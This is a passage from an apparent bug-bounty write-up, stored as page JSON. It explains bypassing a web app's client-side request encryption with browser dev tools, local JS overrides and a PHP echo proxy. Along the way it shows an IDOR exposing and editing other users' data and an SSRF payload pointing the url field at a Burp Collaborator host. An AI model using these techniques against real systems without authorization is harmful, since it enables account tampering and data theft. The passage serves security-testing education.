goal — Second Round:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_29":{"__typename":"Paragraph","id":"449009ef02f6_29","name":"3fda","type":"P","href":null,"layout":null,"metadata":null,"text":"I opened the Sources window in dev tools and searched for getBytesSync and found some results, but because the file was minimized, I used the pretty print feature in the browser to make it more readable.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":58,"end":70,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":13,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":31,"end":40,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":58,"end":70,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":142,"end":155,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*wXYihEII8FQdVVcFoi3tiw.png":{"__typename":"ImageMetadata","id":"1*wXYihEII8FQdVVcFoi3tiw.png","originalHeight":1229,"originalWidth":1190,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_30":{"__typename":"Paragraph","id":"449009ef02f6_30","name":"f5e6","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*wXYihEII8FQdVVcFoi3tiw.png"},"text":"making the code more readable","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_31":{"__typename":"Paragraph","id":"449009ef02f6_31","name":"bb77","type":"P","href":null,"layout":null,"metadata":null,"text":"I ended up with a function called “encrypt” in line 137777, and as you can see above, this function takes 2 arguments, let’s add a breakpoint to pause the JS execution and inspect this function and check what is going on.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":35,"end":44,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":52,"end":60,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":66,"end":67,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*4ni_4F1kHrGZM31WvLIFOQ.png":{"__typename":"ImageMetadata","id":"1*4ni_4F1kHrGZM31WvLIFOQ.png","originalHeight":471,"originalWidth":1352,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_32":{"__typename":"Paragraph","id":"449009ef02f6_32","name":"b4fe","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*4ni_4F1kHrGZM31WvLIFOQ.png"},"text":"Adding breakpoints","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_33":{"__typename":"Paragraph","id":"449009ef02f6_33","name":"597a","type":"P","href":null,"layout":null,"metadata":null,"text":"After initiating a random request to invoke the breakpoint, I found the following","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*5_GmYYW8SHBTcaFLure-ow.png":{"__typename":"ImageMetadata","id":"1*5_GmYYW8SHBTcaFLure-ow.png","originalHeight":614,"originalWidth":1460,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_34":{"__typename":"Paragraph","id":"449009ef02f6_34","name":"602a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*5_GmYYW8SHBTcaFLure-ow.png"},"text":"checking the DOM after invoking the breakpoint","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_35":{"__typename":"Paragraph","id":"449009ef02f6_35","name":"4487","type":"P","href":null,"layout":null,"metadata":null,"text":"One of the arguments of encrypt function is _0x3fc2ff, and its value as you can see in the Scope section is a JSON object, so let’s move to the console to fully understand its components.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":24,"end":32,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":44,"end":53,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":91,"end":97,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":144,"end":152,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_36":{"__typename":"Paragraph","id":"449009ef02f6_36","name":"d230","type":"P","href":null,"layout":null,"metadata":null,"text":"As the breakpoint is on, we can print and perform actions while the application paused.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_37":{"__typename":"Paragraph","id":"449009ef02f6_37","name":"34b6","type":"H4","href":null,"layout":null,"metadata":null,"text":"Analyzing the data passed to the “encrypt” function:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*KZudihMhdhgzboqQVN2_sw.png":{"__typename":"ImageMetadata","id":"1*KZudihMhdhgzboqQVN2_sw.png","originalHeight":328,"originalWidth":1460,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_38":{"__typename":"Paragraph","id":"449009ef02f6_38","name":"876b","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*KZudihMhdhgzboqQVN2_sw.png"},"text":"original request body","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_39":{"__typename":"Paragraph","id":"449009ef02f6_39","name":"3134","type":"P","href":null,"layout":null,"metadata":null,"text":"A JSON object contains multiple keys\u002Fvalues that the API uses to handle the requests, so this is the original request body before any type of encryption.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_40":{"__typename":"Paragraph","id":"449009ef02f6_40","name":"f71e","type":"P","href":null,"layout":null,"metadata":null,"text":"The request is sent to \u002Fv1\u002Fuser API endpoint with two parameters domain and user , and returns all information about this user as you can see below","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":23,"end":31,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":65,"end":71,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":76,"end":80,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":23,"end":31,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":65,"end":72,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":76,"end":81,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":82,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":122,"end":127,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ZJAaXWZ_wbFa46PfqVr4oA.png":{"__typename":"ImageMetadata","id":"1*ZJAaXWZ_wbFa46PfqVr4oA.png","originalHeight":719,"originalWidth":1472,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_41":{"__typename":"Paragraph","id":"449009ef02f6_41","name":"7729","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ZJAaXWZ_wbFa46PfqVr4oA.png"},"text":"returned data from the request","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_42":{"__typename":"Paragraph","id":"449009ef02f6_42","name":"a912","type":"P","href":null,"layout":null,"metadata":null,"text":"As you may guess, we can test for IDOR in the user parameter, let’s change it to another username and check the response!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":46,"end":50,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":46,"end":50,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*ZezDoEUMPE0we-IUCaURsQ.png":{"__typename":"ImageMetadata","id":"1*ZezDoEUMPE0we-IUCaURsQ.png","originalHeight":437,"originalWidth":1460,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_43":{"__typename":"Paragraph","id":"449009ef02f6_43","name":"24e1","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*ZezDoEUMPE0we-IUCaURsQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_44":{"__typename":"Paragraph","id":"449009ef02f6_44","name":"0b25","type":"P","href":null,"layout":null,"metadata":null,"text":"and the result was promising!","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Qlk4XR-G7LcelHPpn0jUFQ.png":{"__typename":"ImageMetadata","id":"1*Qlk4XR-G7LcelHPpn0jUFQ.png","originalHeight":579,"originalWidth":1311,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_45":{"__typename":"Paragraph","id":"449009ef02f6_45","name":"df08","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Qlk4XR-G7LcelHPpn0jUFQ.png"},"text":"IDOR confirmed","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_46":{"__typename":"Paragraph","id":"449009ef02f6_46","name":"af74","type":"P","href":null,"layout":null,"metadata":null,"text":"Great! a valid IDOR vulnerability was confirmed, after digging more, I found multiple other IDORs that lead me to edit any user information like email and phone number, etc.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_47":{"__typename":"Paragraph","id":"449009ef02f6_47","name":"1f56","type":"P","href":null,"layout":null,"metadata":null,"text":"What about the url parameter?","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":15,"end":18,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":15,"end":18,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_48":{"__typename":"Paragraph","id":"449009ef02f6_48","name":"e058","type":"P","href":null,"layout":null,"metadata":null,"text":"What came to my mind is to test for SSRF in the url parameter, so I changed its value to my burp collaborator to check if we can get an internal interaction.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":48,"end":51,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":48,"end":52,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_49":{"__typename":"Paragraph","id":"449009ef02f6_49","name":"2d8c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"{\"url\":\"\u002Fv1\u002Fuser\",\"method\":\"get\",\"headers\":{\"common\":{\"Accept\":\"application\u002Fjson, text\u002Fplain, *\u002F*\"},\"delete\":{},\"get\":{},\"head\":{},\"post\":{\"Content-Type\":\"application\u002Fx-www-form-urlencoded\"},\"put\":........}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"json"},"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_50":{"__typename":"Paragraph","id":"449009ef02f6_50","name":"788a","type":"P","href":null,"layout":null,"metadata":null,"text":"Changed to:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_51":{"__typename":"Paragraph","id":"449009ef02f6_51","name":"5f54","type":"PRE","href":null,"layout":null,"metadata":null,"text":"{\"url\":\"http:\u002F\u002Fmycollab.burpcollaborator.net\",\"method\":\"get\",\"headers\":{\"common\":{\"Accept\":\"application\u002Fjson, text\u002Fplain, *\u002F*\"},\"delete\":{},\"get\":{},\"head\":{},\"post\":{\"Content-Type\":\"application\u002Fx-www-form-urlencoded\"},\"put\":........}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"json"},"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*eeiaLlmgBLPYzTIIySTjTg.png":{"__typename":"ImageMetadata","id":"1*eeiaLlmgBLPYzTIIySTjTg.png","originalHeight":611,"originalWidth":1378,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_52":{"__typename":"Paragraph","id":"449009ef02f6_52","name":"8c0f","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*eeiaLlmgBLPYzTIIySTjTg.png"},"text":"SSRF confirmed","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_53":{"__typename":"Paragraph","id":"449009ef02f6_53","name":"5e2d","type":"P","href":null,"layout":null,"metadata":null,"text":"As you can see, I forward the request, then got an interaction!","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_54":{"__typename":"Paragraph","id":"449009ef02f6_54","name":"69a6","type":"H4","href":null,"layout":null,"metadata":null,"text":"What should I do if I couldn’t reach to the original JS file?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_55":{"__typename":"Paragraph","id":"449009ef02f6_55","name":"d323","type":"P","href":null,"layout":null,"metadata":null,"text":"I used the above method to speed up the process of bypassing the encryption just by searching inside the js file with words that are already used in the original file, this method will not help you if you didn’t reach the original js file or any piece of code that can lead you the function that encrypts the request body.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_56":{"__typename":"Paragraph","id":"449009ef02f6_56","name":"8c8a","type":"P","href":null,"layout":null,"metadata":null,"text":"Now let’s assume that there is no android application at all and no original js files, and we need to bypass it!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":112,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_57":{"__typename":"Paragraph","id":"449009ef02f6_57","name":"141d","type":"P","href":null,"layout":null,"metadata":null,"text":"We can make use of the Event Listener Breakpoints tap in the browser’s dev tools which helps us to add breakpoints to pause the application when event listeners are hit\u002Ffired, we can select specific events, such as load, and error, etc.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":215,"end":219,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":225,"end":230,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":23,"end":50,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":60,"end":81,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":215,"end":219,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":225,"end":230,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_58":{"__typename":"Paragraph","id":"449009ef02f6_58","name":"0345","type":"P","href":null,"layout":null,"metadata":null,"text":"The event that will be useful for us is click, so when we click on any button that initiates an API request the execution pauses, and the source panel displays the highlighted line of the JavaScript code that is next to be executed, along with the surrounding code for context. In addition, we have buttons to step over that line of code or resume execution.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":40,"end":45,"href":"","anchorType":"LINK","userId":"","linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":40,"end":45,"href":"","anchorType":"LINK","userId":"","linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*xRlKHRufd4jnlcAM_XxZGw.png":{"__typename":"ImageMetadata","id":"1*xRlKHRufd4jnlcAM_XxZGw.png","originalHeight":1752,"originalWidth":4380,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_59":{"__typename":"Paragraph","id":"449009ef02f6_59","name":"46ce","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*xRlKHRufd4jnlcAM_XxZGw.png"},"text":"Setting up Event Listener Breakpoints","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_60":{"__typename":"Paragraph","id":"449009ef02f6_60","name":"8cb4","type":"P","href":null,"layout":null,"metadata":null,"text":"I selected click event and then I clicked a button that initiates an API request, the execution paused, and then I used the step-over buttons till I reach a function that takes the full request body!","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":11,"end":16,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":11,"end":16,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":124,"end":142,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*s1YxV1ydQaxYeTWo-ZojHg.png":{"__typename":"ImageMetadata","id":"1*s1YxV1ydQaxYeTWo-ZojHg.png","originalHeight":1729,"originalWidth":4321,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_61":{"__typename":"Paragraph","id":"449009ef02f6_61","name":"b639","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*s1YxV1ydQaxYeTWo-ZojHg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_62":{"__typename":"Paragraph","id":"449009ef02f6_62","name":"7df9","type":"P","href":null,"layout":null,"metadata":null,"text":"But as expected, it takes a bit of time to reach it.\nNow again, I can edit the request before being encrypted.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":17,"end":51,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_63":{"__typename":"Paragraph","id":"449009ef02f6_63","name":"8ec5","type":"H4","href":null,"layout":null,"metadata":null,"text":"This application is large, and editing every request with this method is a waste of time!","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_64":{"__typename":"Paragraph","id":"449009ef02f6_64","name":"c691","type":"P","href":null,"layout":null,"metadata":null,"text":"The application has many functions, and many API calls, which means I should intercept every request in the same way! it wastes the time, right?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_65":{"__typename":"Paragraph","id":"449009ef02f6_65","name":"c58d","type":"P","href":null,"layout":null,"metadata":null,"text":"So we need to find a method to be able to intercept the requests easily, (e.g. with burp suite), and to do so, we have two options:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_66":{"__typename":"Paragraph","id":"449009ef02f6_66","name":"035b","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Understand how the application encrypts the request body and finds a way to decrypt it.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_67":{"__typename":"Paragraph","id":"449009ef02f6_67","name":"e9ee","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Edit the javascript file and run our own file.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_68":{"__typename":"Paragraph","id":"449009ef02f6_68","name":"6226","type":"P","href":null,"layout":null,"metadata":null,"text":"The first option will take a long time especially since the file is obfuscated, so let’s stick to the second option.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_69":{"__typename":"Paragraph","id":"449009ef02f6_69","name":"5be8","type":"P","href":null,"layout":null,"metadata":null,"text":"We can use the override feature to do that, with override, we can take a resource from the current webpage and store it locally. When you refresh the webpage, the browser doesn’t load the resource from the server. Instead, the browser replaces the server resource with your local copy of the resource.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":15,"end":24,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":49,"end":58,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*dJ9bXoM6lptGVzMeGgZGkA.png":{"__typename":"ImageMetadata","id":"1*dJ9bXoM6lptGVzMeGgZGkA.png","originalHeight":758,"originalWidth":1401,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_70":{"__typename":"Paragraph","id":"449009ef02f6_70","name":"91bd","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*dJ9bXoM6lptGVzMeGgZGkA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*EQ5eRIjXr9GEp1dgoNsFwg.png":{"__typename":"ImageMetadata","id":"1*EQ5eRIjXr9GEp1dgoNsFwg.png","originalHeight":633,"originalWidth":1509,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_71":{"__typename":"Paragraph","id":"449009ef02f6_71","name":"a8a7","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*EQ5eRIjXr9GEp1dgoNsFwg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_72":{"__typename":"Paragraph","id":"449009ef02f6_72","name":"99e8","type":"P","href":null,"layout":null,"metadata":null,"text":"We are now ready to edit this file, so the next step is to add some kind of a middle layer (e.g. proxy) into this function to make it encrypt our edited input, not the value that the application passes to the function.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_73":{"__typename":"Paragraph","id":"449009ef02f6_73","name":"7c61","type":"P","href":null,"layout":null,"metadata":null,"text":"We can do this in more than one way, but let’s keep it simple. \nI launched my localhost, and created a simple PHP file that maps the request body to the response, just like below:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_74":{"__typename":"Paragraph","id":"449009ef02f6_74","name":"5b68","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\u003C?php\n\n# to allow cross origin requests.\nheader(\"Access-Control-Allow-Origin: https:\u002F\u002F█████████████\");\nheader(\"Access-Control-Allow-Credentials: true\");\nheader(\"Content-Type: application\u002Fjson; charset=UTF-8\");\nheader(\"Access-Control-Allow-Methods: POST\");\n\n# get the request body as it is\n$data = file_get_contents(\"php:\u002F\u002Finput\");\n\n# return it back\necho $data; \n\n?\u003E","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"php"},"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_75":{"__typename":"Paragraph","id":"449009ef02f6_75","name":"1375","type":"P","href":null,"layout":null,"metadata":null,"text":"So the idea is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_76":{"__typename":"Paragraph","id":"449009ef02f6_76","name":"c517","type":"ULI","href":null,"layout":null,"metadata":null,"text":"When the application calls the “encrypt” function, it passes two arguments, one of which is the original body.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":32,"end":41,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_77":{"__typename":"Paragraph","id":"449009ef02f6_77","name":"98e2","type":"ULI","href":null,"layout":null,"metadata":null,"text":"We send a request to our PHP file with the original body, so we can edit it via burp. (Note that we should allow cross-origin requests)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_78":{"__typename":"Paragraph","id":"449009ef02f6_78","name":"af59","type":"ULI","href":null,"layout":null,"metadata":null,"text":"The PHP file will return our edited body.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_79":{"__typename":"Paragraph","id":"449009ef02f6_79","name":"b3ea","type":"ULI","href":null,"layout":null,"metadata":null,"text":"We pass the response to the next step in the encrypt function.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":45,"end":53,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_80":{"__typename":"Paragraph","id":"449009ef02f6_80","name":"32f1","type":"P","href":null,"layout":null,"metadata":null,"text":"I created the following asynchronous function that sends the request to our proxy and returns the edited response:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":24,"end":37,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_81":{"__typename":"Paragraph","id":"449009ef02f6_81","name":"fefb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"async function editBeforeSend(originalBody) {\n const req = await fetch(\"http:\u002F\u002Fproxy.melotover.local\u002FeditBeforeSend.php\",\n  {\n   method: \"POST\",\n   body: originalBody,\n   credentials: 'include'\n  });\n let editedBody = await req.text();\n return editedBody;\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"javascript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_82":{"__typename":"Paragraph","id":"449009ef02f6_82","name":"3d26","type":"P","href":null,"layout":null,"metadata":null,"text":"I added it to the javascript file, then called it inside encrypt function","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":57,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*P1Wq3qFA_eSuiZzC7zWyWg.png":{"__typename":"ImageMetadata","id":"1*P1Wq3qFA_eSuiZzC7zWyWg.png","originalHeight":241,"originalWidth":1351,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:449009ef02f6_83":{"__typename":"Paragraph","id":"449009ef02f6_83","name":"0315","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*P1Wq3qFA_eSuiZzC7zWyWg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:449009ef02f6_84":{"__typename":"Paragraph","id":"449009ef02f6_84","name":"60a7","type":"P","href":null,"layout":null,"metadata":null,"text":"That's it! I saved the file, refreshed the page, and invoked any request to the 